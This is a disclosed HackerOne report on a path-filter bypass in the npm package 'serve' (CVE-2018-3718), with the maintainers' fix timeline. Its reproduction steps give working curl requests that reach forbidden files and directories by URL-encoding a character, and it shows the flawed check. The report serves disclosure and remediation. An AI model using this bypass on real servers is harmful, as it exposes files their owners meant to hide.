---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/information-exposure-through-directory-listing
  - env/web
  - stack/node
substate: "resolved"
weakness: "Information Exposure Through Directory Listing"
enriched: true
body: true
date: 2018-03-13
submitted: 2018-01-24T19:02:23.144Z
bounty_usd: null
votes: 15
cve: "CVE-2018-3718"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "0xchr00t"
source: "https://hackerone.com/reports/308721"
title: "[serve] Directory listing and File access even when they have been set to be ignored."
---
# [serve] Directory listing and File access even when they have been set to be ignored.

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 15 | **Program:** Node.js third-party modules | **Disclosed:** 2018-03-13

- Report: [https://hackerone.com/reports/308721](https://hackerone.com/reports/308721)
- CWE: Information Exposure Through Directory Listing | CVE: CVE-2018-3718
- Submitted: 2018-01-24T19:02:23.144Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Module:** 
- **Name**: `serve`
- **Version**: latest (`6.4.9`)
- **Link**: https://www.npmjs.com/package/serve

**Description:**
The `serve` modules allows directory browsing and to serve static files through the browser.
The config option `ignore` can be used to tell the module which file or directory are forbidden and should not be served. 
This rule can be bypassed by url encoding the name of the file or directory that has been forbidden. 

## Reproduction Steps:
- Install `serve`
- Create an application that uses serve for file serving listing and set a few folders and files in the `ignore` config.

```javascript
const serve = require('serve')
const server = serve(__dirname, {
	  port: 1337,
	  ignore: ['testfolder', 'test.txt']
})
```
- Run the app

```bash
$ node filename.js
```
- Now, current directory will be served by `serve` with the exception of folder `testfolder` and file `test.txt`
- If we try to curl `test.txt` we get a `Not Found` error

```bash
$ curl http://localhost:1337/test.txt
Not Found
```
- The url encoded value for `e` is `%65`. So after replacing an `e` with its url encoded form, we are able to access the file.

```bash
$ curl http://localhost:1337/t%65st.txt
this is a forbidden file :D
```
- Additionally, curling the directory `testfolder` returns a 404 too.

```bash
$ curl http://localhost:1337/testfolder/
Not Found
```
- Applying the same strategy as above, we are able to get a listing of all the files and folders inside the restricted directory.

```html
$ curl http://localhost:1337/t%65stfolder/
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Files within testserve/testfolder/</title>
      .
      .
          <li>
            <a href="/testfolder/testfile.txt" title="testfile.txt" class="txt">testfile.txt</a>
            <i>31 B</i>
          </li>
      .
      .
```
- And then we can further access the files inside the forbidden folder using same strategy.

```bash
$ curl http://localhost:1337/t%65stfolder/testfile.txt
this is a test ... forbidden !
```


## Mitigation Strategy
From what I could gather, this is happening because the path variable that is being checked against the user created forbidden folders blacklist, is essentially different from the one which is being used to serve the file/folder. 
Note these particular lines in file `/lib/server.js`-

```javascript
90  const ignored = !ignoredFiles.every(item => {
91    return !pathname.includes(item)
92  })
```
Line `91` handles the logic for checking if one of the ignored folder/file names is present in the current requested path. Note that here, the variable `pathname` is used. This variable is not url decoded, while the variable which is used to actually serve the file is named `related` and is url decoded by passing requested path through `decodeURIComponent` function.
So one strategy would be to use the `related` variable for checking against the blacklist too.

## Impact

The issue essentially bypasses the `ignore files/folders` feature and allows an attacker to read from a directory/file that the victim has not allowed access to.

## Timeline

- **Report Filed**
- **2018-01-24** @vdeturckheim: Hey @digitalwizard ,

Thanks a lot for reporting this to us, I will look at this issue shortly and keep you updated!
- **Report Triaged**
- **2018-01-24** @0xchr00t: Wow, that was a very swift response :)
And no, I did not contact Leo. I thought doing it through this program would be a better option and it'll keep all the discussion in one place.
- **2018-01-24** @vdeturckheim: @digitalwizard perfect, we always ask in order to know if we should contact the maintainers ourselves. I invited him a few minutes ago :)
- **Cve Id Added**
- **2018-02-13** @0xchr00t: Hi @vdeturckheim ,
Has there been an update on this?
- **2018-02-15** @vdeturckheim: @digitalwizard sadly no. I will ping him back.
- **2018-03-04** @vdeturckheim: I pinged Zeit team as @lirantal suggested.
- **External User Joined**
- **External User Joined**
- **2018-03-04** @matheus: Hi @digitalwizard and @vdeturckheim,

Thank you for reporting and for your patience.

I apologize for the misunderstanding – security is our topmost priority and this should have been handled as soon as we were first notified about it.

We can reproduce the issue and a fix will be out in the next 24h. Will keep you posted here.
- **2018-03-04** @vdeturckheim: Awesome, thanks @matheus
- **2018-03-04** @matheus: @digitalwizard,

@timn just submitted a fix and proper tests for this issue: https://github.com/zeit/serve/pull/341

We'd like you to review it before we release it. Thank you!
- **2018-03-05** @0xchr00t: Great job @matheus ,
The PR by @timn fixes the issue.
- **External User Joined**
- **2018-03-05** @notquiteleo: Thank you for reporting this, @digitalwizard!

The fix was just released with the latest update: https://github.com/zeit/serve/releases/tag/6.5.2
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Severity Updated**
